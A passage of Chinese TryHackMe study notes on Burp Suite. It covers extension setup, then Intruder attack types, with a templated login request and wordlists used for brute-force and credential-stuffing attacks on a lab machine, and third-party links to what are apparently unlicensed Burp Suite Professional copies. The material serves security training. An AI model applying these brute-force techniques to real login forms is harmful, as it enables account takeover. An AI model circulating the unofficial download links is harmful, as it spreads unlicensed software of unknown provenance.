                     data-src="/../articleimg/image-20240105190255315.png"
                      alt="image-20240105190255315"
                ></p>
<p>成功安装上述扩展后，我们可以注意到Burp Suite界面顶部的主菜单中出现了一个新的选项卡名为”Request Timer”；不同的Burp扩展可能有不同的行为，有些扩展可能会向右键单击上下文菜单中添加新项目，而另一些扩展可能会在Burp Suite的主菜单栏中创建全新的选项卡。</p>
<h2 id="Jython"><a href="#Jython" class="headerlink" title="Jython"></a>Jython</h2><p>如果我们想在Burp Suite中使用由Python所编写的Burp扩展，那么我们就需要下载并包含Jython Interpreter(解释器) JAR文件。</p>
<p>tips：Jython解释器是Python的Java实现，它使我们能够在Burp Suite中运行由Python语言所编写的Burp扩展。</p>
<p>我们可以按照以下步骤来将Jython集成到本地计算机上的Burp Suite中：</p>
<ol>
<li><p>下载Jython JAR：访问<a class="link"   href="https://www.jython.org/download" >Jython官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>并下载独立的JAR存档，为此我们需要在Jython下载页面中先找到Jython Standalone选项，然后将相关的JAR文件保存到计算机磁盘中的某个位置即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240105191823762.png"
                      alt="image-20240105191823762"
                ></p>
</li>
<li><p>准备在Burp Suite中配置Jython：打开Burp Suite并切换到Extensions功能模块，然后转到Extensions settings子选项卡。</p>
</li>
<li><p>查看Python环境：现在我们已经处于Extensions settings子选项卡界面，我们需要向下滚动到“Python environment”部分。</p>
</li>
<li><p>设置Jython JAR位置：在”Location of Jython standalone JAR file”字段下方的选项栏中，设置我们刚才已经下载的Jython JAR文件的路径。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240105192516511.png"
                      alt="image-20240105192516511"
                ></p>
</li>
</ol>
<p>完成上述这些步骤之后，Jython就会被集成到Burp框架中，从而允许我们在Burp Suite中使用由Python所编写的Burp扩展；这种集成显著地增加了可用的Burp扩展的数量，并能增强我们执行各种安全测试和Web应用程序评估任务的能力。</p>
<p>tips：完成Jython集成之后，我们就可以从BApp商店安装由Python所编写的Burp扩展模块了。</p>
<p>注意：将Jython添加到Burp Suite的过程对于所有操作系统都是相同的，因为Java是一种跨平台技术。</p>
<p>在处理由Ruby语言编写的Burp扩展时我们还需要在Burp Suite中集成JRuby，但是在此我们不必展开讨论如何集成JRuby，因为：</p>
<ol>
<li>由Python语言所编写的Burp扩展模块更为常见；</li>
<li>集成JRuby与集成Jython的过程完全相同，无需赘述。</li>
</ol>
<p>我们可以通过访问以下链接来下载JRuby JAR归档文件的最新副本： <a class="link"   href="https://www.jruby.org/download" >https://www.jruby.org/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Burp-Suite-API"><a href="#Burp-Suite-API" class="headerlink" title="Burp Suite API"></a>Burp Suite API</h2><p>在Burp Suite的Extensions模块中，我们可以访问各种API端点，这些API端点允许我们创建自定义模块并能将其与Burp Suite集成；Extensions模块中的APIs公开了各种功能，从而使得我们可以扩展Burp Suite框架以满足一些特定需求。</p>
<p>为了查看可用的API端点，我们可以导航至Extensions模块中的APIs子选项卡，在该子选项卡界面的左侧面板中所列出的每个项目都代表一个可以从Burp扩展内部访问的不同API端点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240105195340091.png"
                      alt="image-20240105195340091"
                ></p>
<p>在编写自定义Burp扩展时，Extensions APIs能够为开发人员提供强大的功能和灵活性。我们可以使用这些APIs与Burp Suite的现有功能进行无缝交互，并能定制我们的Burp扩展以执行特定任务。</p>
<p>Burp Suite支持使用多种语言来编写Burp扩展，例如：</p>
<ol>
<li>Java(本机)：我们可以直接使用Java语言为Burp Suite编写Burp扩展，在实际编写扩展时我们可以利用上述所提及的可用的、强大的APIs；</li>
<li>Python(通过Jython解释器)：我们可以基于Python语言来编写扩展，但是在Burp Suite中我们将使用Jython(Python的Java实现)来创建Burp扩展。</li>
<li>Ruby(通过JRuby解释器)：我们可以基于Ruby语言来编写扩展，但是在Burp Suite中我们将利用JRuby(Ruby的Java实现)来构建Burp扩展。</li>
</ol>
<p>tips：我们可以使用Burp Suite所支持的编程语言与Extensions模块中的API端点交互，进而编写功能强大的Burp扩展；</p>
<p>需要注意的是，为Burp Suite编写扩展可能是一项复杂的任务，如果对编写自定义的Burp扩展感兴趣，可以查看PortSwigger官方所提供的参考示例：</p>
<blockquote>
<p><a class="link"   href="https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension" >https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h2 id="小结-Pro版下载链接"><a href="#小结-Pro版下载链接" class="headerlink" title="小结&amp;Pro版下载链接"></a>小结&amp;Pro版下载链接</h2><p>本文主要介绍了Burp Suite的Extensions模块，我们不仅可以从BApp商店中安装许多强大的Burp扩展，还可以使用Java、Python或Ruby来编写Burp扩展(在实际编写Burp扩展时，将会涉及到API端点的调用) 。</p>
<p>到目前为止，我们已经完成了Burp Suite工具的整个学习模块，我们主要介绍的是Burp Suite社区版的使用，其他的版本还有Burp Suite专业版以及Burp Suite企业版。</p>
<p>关于Burp Suite专业版的第三方获取链接如下(验证：52pj)：</p>
<ul>
<li><a class="link"   href="https://www.123pan.com/s/F2W5Vv-Rk7Vv.html" >https://www.123pan.com/s/F2W5Vv-Rk7Vv.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g#list/path=%2F" >https://pan.baidu.com/s/1J_CUxLKqC0h3Ypg4sQV0_g#list/path=%2F <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Burp Suite：Intruder(Burp Suite攻击器·更新版)-学习</title>
    <url>/2024/01/27/THM-Burp%20Suite%EF%BC%9AIntruder(Burp%20Suite%E6%94%BB%E5%87%BB%E5%99%A8%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/burpsuiteintruder" >https://tryhackme.com/room/burpsuiteintruder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解如何使用 Intruder 在 Burp Suite 中自动化执行请求。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，我们将探索Burp Suite的Intruder模块，该模块能够提供自动请求操作并支持完成模糊测试和暴力破解等任务。</p>
<p>Burp Suite的Intruder模块是一个强大的工具，它允许我们执行自动化和可定制的攻击，它提供了修改请求的特定部分以及使用不同的输入数据来执行重复测试的能力。对于需要针对目标站点测试不同值的模糊测试和暴力破解等任务，Intruder模块尤其有用。</p>
<p><strong>前置学习基础</strong></p>
<p>在学习本文内容之前，建议先阅读并理解以下博客文章内容：</p>
<ul>
<li><a class="link"   href="https://www.cnblogs.com/Hekeats-L/p/17924223.html" >【THM】Burp Suite：The Basics(Burp Suite基础·更新版)-学习 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.cnblogs.com/Hekeats-L/p/17929160.html" >【THM】Burp Suite：Repeater(Burp Suite重放器·更新版)-学习 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>实验环境部署</strong></p>
<p>我们可以在与本文相关的Tryhackme实验房间中一键部署目标虚拟机，并且我们还能在相关的THM实验房间中使用THM官方所提供的AttackBox来作为自己的攻击机，当然使用自己的本地kali机器作为攻击机也是可以的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231227000143478.png"
                      alt="image-20231227000143478"
                ></p>
<h2 id="什么是Intruder？"><a href="#什么是Intruder？" class="headerlink" title="什么是Intruder？"></a>什么是Intruder？</h2><p>Intruder(入侵者，攻击器)是Burp Suite的内置模糊测试工具，它允许我们自动化地修改请求并通过使用不同的输入值来进行重复测试，这在模糊测试或者暴力破解攻击中非常有用。</p>
<p>Intruder可以接受一个请求(通常是Burp Proxy先捕获到请求再转发至Intruder中)，并能使用这个请求作为模版来自动向目标服务器发送大量具有细微差别的请求。例如，通过捕获包含登录尝试的请求，我们可以配置Intruder将用户名和密码字段替换为字典中的值，从而能够允许我们对登录表单进行暴力破解攻击；类似地，我们也可以导入模糊测试字典，并结合Intruder对子目录、端点或虚拟主机进行模糊测试，Intruder的主要功能与Wfuzz或Ffuf命令行工具类似。</p>
<p>简而言之，作为一种执行自动化请求的工具，Intruder非常强大，但是还有一个问题：如果想不限速率地使用Intruder，那么我们必须下载Burp Suite专业版。当我们在Burp Suite社区版中使用Intruder模块时，它会受到一定的速率限制，而这种速度限制可能会让许多渗透测试人员选择使用其他工具来进行模糊测试和暴力破解攻击。尽管如此，Intruder模块仍然是一个很有价值的工具，值得我们去学习如何有效地使用它。</p>
<p>让我们查看一下Intruder模块的选项卡界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231227214712385.png"
                      alt="image-20231227214712385"
                ></p>
<p>如上图所示，我们能够在Position子选项卡中看到Target，此处允许我们选择攻击目标。</p>
<p>如果我们从Burp Proxy中发送一个被拦截的请求到Intruder(使用<code>Ctrl + I</code>快捷键或者右键单击请求消息并选择“发送给Intruder”即可)，那么此时Target字段就会被自动填充。</p>
<p>Intruder中有四个子选项卡：</p>
<ul>
<li><p>Positions(位置)：这个子选项卡允许我们选择攻击类型，并且能够配置我们想要在请求模板中插入的有效载荷(Payload)的位置。</p>
</li>
<li><p>Payloads(有效载荷)：这个子选项卡允许我们选择不同的payload(有效载荷)并将其插入到我们在Positions子选项卡中所定义的每个位置，例如我们可以选择从指定的字典文件中加载项目以作为一种有效载荷，至于如何将有效载荷插入到请求模板中，则取决于我们在Positions子选项卡中所选择的攻击类型；Payloads子选项卡还能够让我们修改Intruder中关于有效载荷的行为，例如为每个有效载荷定义预处理规则——添加前缀或后缀、执行匹配和替换或者根据已定义的正则表达式来跳过成功匹配到的有效载荷等等。</p>
</li>
<li><p>Resource Pool(资源池)：这个子选项卡主要允许我们在各种自动化任务之间进行资源分配，这对于Burp Suite社区版而言并不是特别有用；Burp Suite专业版允许我们在Burp后台运行各种类型的自动化任务，而Resource Pool就是我们希望在这些自动化任务和Intruder之间分配可用内存和计算机处理能力的地方；如果我们不能访问后台自动化的任务，那么使用Resource Pool就没有什么意义(本文所使用的是Burp社区版，所以并不能访问后台自动化任务)。</p>
</li>
<li><p>Settings(设置)：Intruder允许我们在Settings子选项卡中配置攻击行为，这里的设置主要将应用于Burp如何处理结果以及Burp如何处理攻击本身；例如，我们可以选择标记包含指定文本片段的请求，或者定义Burp如何处理重定向(3xx)响应。</p>
</li>
</ul>
<p>tips：模糊测试是指我们取一组数据并将其应用于参数，从而测试目标功能或查看是否存在异常响应；例如，我们可以针对web应用程序进行端点模糊测试，我们只需将字典文件中的每个项目添加到Web请求URL的末尾并进行多次发送，然后查看服务器会如何响应即可(如<code>http://MACHINE_IP/WORD_GOES_HERE</code>)。</p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节的内容，并回答以下问题。</p>
<p>我们可以在哪个 Intruder 子选项卡中为我们计划的攻击定义“攻击类型”？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231229100338273.png"
                      alt="image-20231229100338273"
                ></p>
<h2 id="Positions子选项卡"><a href="#Positions子选项卡" class="headerlink" title="Positions子选项卡"></a>Positions子选项卡</h2><p>当我们想要使用 Intruder 进行攻击时，我们需要做的第一件事就是查看Positions子选项卡，这个子选项卡会告诉 Intruder 在什么位置插入有效载荷。</p>
<p>让我们切换到Intruder中的“Positions”子选项卡界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231229100757842.png"
                      alt="image-20231229100757842"
                ></p>
<p>请注意，Burp Suite默认会为我们标记一些最有可能插入有效载荷的位置(Position)——这些位置将以绿色背景突出显示并会被silcrows ( <code>§</code>)符号所包围。</p>
<p>在Positions子选项卡界面的右侧，我们可以选择“添加<code>§</code>”、“清除<code>§</code>”和“自动<code>§</code>”按钮：</p>
<ul>
<li><code>Add §</code>： 我们可以在请求消息编辑框中突出显示某些字段并通过单击此按钮来添加新的插入位置。</li>
<li><code>Clear §</code>：点击此按钮会删除所有已定义的位置，从而留给我们一个空白画布来重新定义插入位置。</li>
<li><code>Auto §</code>： 点击此按钮将根据请求消息自动尝试选择一些最可能的插入位置，如果已经清除了默认插入位置但又希望恢复它们，那么该按钮就非常有用。</li>
</ul>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节的内容，并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231229102536261.png"
                      alt="image-20231229102536261"
                ></p>
<h2 id="Payloads子选项卡"><a href="#Payloads子选项卡" class="headerlink" title="Payloads子选项卡"></a>Payloads子选项卡</h2><p>在Burp Suite Intruder的“Payloads-有效载荷”子选项卡中，我们可以为攻击创建、分配和配置具体的有效载荷，该子选项卡分为四个部分：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231229104408328.png"
                      alt="image-20231229104408328"
                ></p>
<ul>
<li><p>Payload Sets(有效载荷集)：</p>
<ul>
<li>这个部分允许我们为请求消息中已标记的攻击位置配置有效载荷集，并能选择想要使用的有效载荷类型。</li>
<li>当使用仅允许单个有效载荷集(Sniper或Battering Ram)的攻击类型时，”Payload Set”下拉列表将只有一个选项，无论定义的位置数量如何。</li>
<li>如果我们使用的是需要多个有效载荷集的攻击类型(Pitchfork或Cluster Bomb)，那么每个攻击位置在”Payload Set”下拉列表中都会有一个对应项目。</li>
<li>注意，在”Payload Set”下拉列表中为多个攻击位置分配编号时，请遵循从上到下、从左到右的顺序；例如，对于被标记的两个攻击位置(用户+密码)，下拉列表中的第一项将引用用户名字段，而第二项将引用密码字段(<code>username=§pentester§&amp;password=§Expl01ted§</code>)。</li>
</ul>
</li>
<li><p>Payload settings(有效载荷设置)：</p>
<ul>
<li><p>此部分将会为当前有效载荷集提供特定于已选的有效载荷类型的选项。</p>
</li>
<li><p>例如，当我们使用”Simple list”有效载荷类型时，我们可以使用“Add-添加”文本框、“Paste-粘贴”行或者从文件中“Load-加载”有效载荷来手动地向集合中添加或删除有效载荷，还可以使用Remove按钮删除当前所选定的行、使用Clear按钮清除整个列表；此外，在加载较大的列表内容时需格外小心，因为它可能会导致Burp Suite崩溃。</p>
</li>
<li><p>每种有效载荷类型都有自己的一组选项和功能，我们需要尽可能地探索可用的选项。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240101195029047.png"
                      alt="image-20240101195029047"
                ></p>
</li>
</ul>
</li>
<li><p>Payload Processing(有效载荷处理)：</p>
<ul>
<li>在这部分中，我们可以定义应用于Payload集合中的每个有效载荷的规则(在将有效载荷发送到目标之前)。</li>
<li>例如，我们可以将字典中的每个单词大写、跳过与特定的正则表达式模式成功匹配的有效载荷、应用其他转换或过滤措施。</li>
<li>虽然我们可能不会经常使用此部分，但是当我们的攻击需要进行特定的有效载荷处理时，此部分就会有很高的使用价值。</li>
</ul>
</li>
<li><p>Payload Encoding(有效载荷编码)：</p>
<ul>
<li>该部分允许我们自定义有效载荷的编码选项。</li>
<li>在默认情况下，Burp Suite会应用URL编码来确保有效载荷的安全传输，然而在某些情况下，我们可能需要调整编码方式；</li>
<li>我们可以通过修改要编码的字符列表或者取消选中“URL-encode these characters”复选框来覆盖默认的URL编码选项。</li>
</ul>
</li>
</ul>
<p>通过利用Burp Suite Intruder中的“Payloads”子选项卡，我们可以创建和自定义有效载荷集，以满足某些Web安全测试的特定需求，我们能够对具体的有效载荷进行微调以进行有效的测试和利用。</p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节的内容，并回答以下问题。</p>
<p>我们可以使用哪个有效载荷处理规则在Payload集合中的每个有效载荷末尾添加字符？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411112806471.png"
                      alt="image-20230411112806471"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102164901650.png"
                      alt="image-20240102164901650"
                ></p>
<h2 id="Intruder攻击类型介绍"><a href="#Intruder攻击类型介绍" class="headerlink" title="Intruder攻击类型介绍"></a>Intruder攻击类型介绍</h2><p>当我们切换到Intruder的Positions子选项卡时，我们还可以从中查看”Attack types” 下拉菜单并选择具体的攻击类型。</p>
<p>Intruder为我们提供了四种可选的攻击类型，每种攻击类型都有其特定的使用目的：</p>
<ul>
<li>Sniper(狙击手)：该攻击类型是默认且最常用的选项，它会循环遍历有效载荷集，并且每次将一个有效载荷插入到请求中已定义的每个攻击位置；Sniper攻击将以线性方式迭代所有有效载荷，从而允许我们进行精确和集中的Web安全测试。</li>
<li>Battering ram(攻城锤)：Battering ram攻击类型与Sniper攻击类型的不同之处在于——Battering ram攻击会同时发送所有的有效载荷，并且每个有效载荷将插入到其对应的各自攻击位置；当我们想测试竞争条件漏洞或者需要在测试中同时发送多个payload时，这种攻击类型会非常有用。</li>
<li>Pitchfork(干草叉)：Pitchfork攻击类型可以使用不同的有效载荷来同时测试多个攻击位置，该攻击类型允许测试人员定义多个有效载荷集，并且每个有效载荷集都会与请求中的特定攻击位置相关联；当存在需要单独测试的不同参数时，这种攻击类型会非常有效。</li>
<li>Cluster bomb(集束炸弹)：Cluster bomb攻击类型结合了Sniper和Pitchfork中的方法，它能对每个攻击位置执行类似于Sniper的攻击，但也会针对每个攻击位置同时测试所有的有效载荷；当测试中存在多个攻击位置且需要有不同的有效载荷时，这种攻击类型会很有用。</li>
</ul>
<p>每种攻击类型都有其优点，适合不同的测试场景，了解它们之间的差异有助于我们根据具体的测试目标来选择合适的攻击类型。</p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a>答题</h3><p>阅读本小节内容，并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102165529800.png"
                      alt="image-20240102165529800"
                ></p>
<h2 id="Sniper攻击"><a href="#Sniper攻击" class="headerlink" title="Sniper攻击"></a>Sniper攻击</h2><p>Sniper(狙击手)是Burp Suite Intruder中默认且最常用的攻击类型，它在针对单个攻击位置进行测试时特别有效，例如密码暴力破解或者API端点模糊测试。</p>
<p>在使用这种攻击类型时，我们将提供一组有效载荷，这可以是单词列表(字典)或者一系列数字，并且我们将使用”Payload Set”来引用那些将要插入到请求中的有效载荷，然后Intruder会获取”Payload Set”中的每个有效载荷，并依次将每个有效载荷插入到请求中的每个已定义的攻击位置。</p>
<p>我们可以查看以下示例模板：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Example Positions</span></span><br><span class="line"></span><br><span class="line">POST /support/login/ HTTP/1.1</span><br><span class="line">Host: MACHINE_IP</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Origin: http://MACHINE_IP</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://MACHINE_IP/support/login/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=§pentester§&amp;password=§Expl01ted§ </span><br></pre></td></tr></table></figure></div>

<p>在上述示例中，我们定义了两个攻击位置(Position)，分别针对用户名(<code>username</code>)和密码(<code>password</code>)主体参数。</p>
<p>当我们使用Sniper攻击来测试上述示例时，Intruder会从有效载荷集中取出每个有效载荷，并且会针对每个已定义的攻击位置依次替换每个有效载荷。</p>
<p>假设我们有一个单词列表，其中包含了三个单词：<code>burp</code>、<code>suite</code>和<code>intruder</code>。</p>
<p>针对上述示例中的两个攻击位置(Position)，Intruder将基于单词列表生成六个请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411063643214.png"
                      alt="image-20230411063643214"
                ></p>
<p>注意Intruder是如何从第一个位置(<code>username</code>)开始并尝试每个有效载荷的，之后Intruder还会移动到第二个位置(<code>password</code>)并再次尝试相同的有效载荷；据此，我们可以计算出Sniper攻击将会发送的请求总数(字典中的单词数*已定义的位置数)：<code>requests = numberOfWords * numberOfPositions</code>。</p>
<p>Sniper非常适合于单位置攻击，例如，在知道用户名的情况下对密码进行暴力破解攻击，或者对单个API端点进行fuzzing测试。</p>
<h3 id="答题-4"><a href="#答题-4" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节的内容，并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20240102174651568.png"
                      alt="image-20240102174651568"
                ></p>
<h2 id="Battering-ram攻击"><a href="#Battering-ram攻击" class="headerlink" title="Battering ram攻击"></a>Battering ram攻击</h2><p>接下来，让我们看一下Battering Ram(攻城锤)攻击类型。</p>
<p>与Sniper一样，Battering ram也是使用一组有效载荷(例如一个单词列表)，但是与Sniper攻击不同的是，Battering Ram会将相同的有效载荷同时放置在所有已定义的攻击位置上，而不是依次将每个有效载荷替换到每个位置。</p>
<p>让我们使用与上一个小节相同的单词列表和请求示例来说明这一点。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Example Positions</span></span><br><span class="line"></span><br><span class="line">POST /support/login/ HTTP/1.1</span><br><span class="line">Host: MACHINE_IP</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Origin: http://MACHINE_IP</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://MACHINE_IP/support/login/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=§pentester§&amp;password=§Expl01ted§</span><br></pre></td></tr></table></figure></div>

<p>针对上述示例中的两个攻击位置，我们将使用与上一小节中相同的单词列表(<code>burp</code>，<code>suite</code>，<code>intruder</code>)来进行Battering ram攻击，此时Intruder会生成三个请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411072823989.png"
                      alt="image-20230411072823989"
                ></p>
<p>如上表所示，在使用Battering ram攻击时，给定单词列表中的每个有效载荷都会同时插入到请求中的每个攻击位置：在Intruder每次生成请求时，示例中的两个攻击位置都会使用相同的有载载荷。</p>
<p>当我们想要同时针对多个攻击位置测试相同的有效载荷而不需要进行顺序替换时，Battering ram(攻城锤)攻击类型会非常有用。</p>
<h3 id="答题-5"><a href="#答题-5" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节的内容，并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411073152849.png"
                      alt="image-20230411073152849"
                ></p>
<h2 id="Pitchfork攻击"><a href="#Pitchfork攻击" class="headerlink" title="Pitchfork攻击"></a>Pitchfork攻击</h2><p>除了Sniper之外，Pitchfork(干草叉)攻击会是我们最可能使用的攻击类型。</p>
<p>我们可以将执行一个Pitchfork攻击想象成同时执行着多个Sniper攻击，Sniper攻击只会使用一个有效载荷集(这个有效载荷集可供每个位置使用)，而Pitchfork则会为每个位置提供一个有效载荷集(这样就需要多个有效载荷集，最多20个)，并会同时迭代所有的攻击位置。</p>
<p>为了更好地理解Pitchfork攻击，让我们继续使用之前的请求示例，但这次我们将使用两个单词列表(两个字典)：</p>
<ol>
<li>第一个单词列表将供<code>username</code>使用，包含三个单词：<code>joel</code>、<code>harriet</code>、<code>alex</code>。</li>
<li>第二个单词列表将供<code>password</code>使用，包含三个单词：<code>J03l</code>、<code>Emma1815</code>、<code>Sk1ll</code>。</li>
</ol>
<p>tips：已知joel用户的密码为J03l，harriet用户的密码为Emma1815，alex用户的密码为Sk1ll。</p>
<p>假设我们使用上述这两个单词列表针对上一小节中的请求示例执行pitchfork攻击，那么Intruder所生成的请求将如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411075757106.png"
                      alt="image-20230411075757106"
                ></p>
<p>如上表所示：在执行Pitchfork攻击时，Intruder会从每个字典中获取第一个单词并将它们同时放入请求中，请求的每个位置对应放入一个单词，然后Intruder会接着对下一个请求重复类似操作——从每个字典中取出第二个单词并将它们同时替换到请求中……。</p>
<p>Intruder将持续进行迭代操作，直到一个(或所有)字典用完为止，在理想情况下，Pitchfork攻击中所使用的多个有效载荷集应该具有相同的长度，因为一旦最短的单词列表被用尽，那么Intruder就会停止攻击测试；例如，如果我们有两个单词列表，第一个单词列表有100个单词，第二个单词列表有90个单词，那么在Pitchfork攻击中Intruder将只会发出90个请求，即第一个单词列表中的最后10个单词将不会被使用。</p>
<p>Pitchfork攻击类型在执行凭据填充攻击(撞库攻击)时特别有用，它允许同时测试需要提供不同有效载荷的多个位置。</p>
<h3 id="答题-6"><a href="#答题-6" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节的内容，可以帮助我们回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411081215108.png"
                      alt="image-20230411081215108"
                ></p>
<h2 id="Cluster-bomb攻击"><a href="#Cluster-bomb攻击" class="headerlink" title="Cluster bomb攻击"></a>Cluster bomb攻击</h2><p>在本小节中，让我们来看一下Intruder中的最后一种攻击类型：Cluster bomb(集束炸弹)。</p>
<p>与Pitchfork攻击一样，Cluster bomb攻击也允许我们选择多个有效载荷集：每个位置一个有效载荷集，最多可以使用20个有效载荷集；但是，Pitchfork攻击会同时迭代每个有效载荷集，而Cluster bomb攻击则是会单独迭代每个有效载荷集，从而确保测试每个可能的有效载荷组合。</p>
<p>为了更好地说明Cluster bomb攻击类型，让我们使用与上一小节相同的单词列表：</p>
<ul>
<li>Usernames： <code>joel</code>， <code>harriet</code>，<code>alex</code>。</li>
<li>Passwords：<code>J03l</code>，<code>Emma1815</code>， <code>Sk1ll</code>。</li>
</ul>
<p>假设我们现在不知道哪个密码属于哪个用户，也就是说：我们现在一共有三个用户和三个密码，但是不知道如何匹配。</p>
<p>在这种情况下，我们可以选择使用Cluster bomb攻击，Intruder将基于每个单词列表中的单词来尝试使用所有可能的组合，最终Intruder将生成如下请求：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411084826484.png"
                      alt="image-20230411084826484"
                ></p>
<p>如上表所示：Cluster Bomb攻击会基于已提供的有效载荷集来迭代每种组合，它通过将每个有效载荷集中的每个单词替换到请求中的相应位置来测试每种可能性。</p>
<p>使用Cluster Bomb攻击会产生大量的流量(请求总数等于每个有效载荷集中的单词数相乘)，所以我们要谨慎使用。</p>
<p>因为在Burp Suite社区版中使用Intruder会受到速率限制，所以我们还要意识到：在Burp社区版中基于中等大小的单词列表来进行Cluster Bomb攻击，可能需要更长的时间才能完成测试。</p>
<p>Cluster Bomb攻击类型适用于任何”用户名和密码匹配情况未知”的凭据暴力破解攻击。</p>
<h3 id="答题-7"><a href="#答题-7" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>阅读本小节的内容，并回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411090246312.png"
                      alt="image-20230411090246312"
                ></p>
<h2 id="简单示例练习"><a href="#简单示例练习" class="headerlink" title="简单示例练习"></a>简单示例练习</h2><p>我们在上文中介绍了很多理论——现在到了我们将上述理论付诸实践的时候了。</p>
<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p>在与本文相关的TryHackMe实验房间中部署目标机器。</p>
<p>让我们尝试访问目标机器的以下页面：<code>/support/login</code>。</p>
<p>tips：<a class="link"   href="http://machine_ip/support/login" >http://MACHINE_IP/support/login <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230411115210973.png"
                      alt="image-20230411115210973"
                ></p>
<p>这是一个相当典型的登录界面，通过查看登录表单的源代码，我们可以发现该登录页面没有实施任何保护措施：</p>
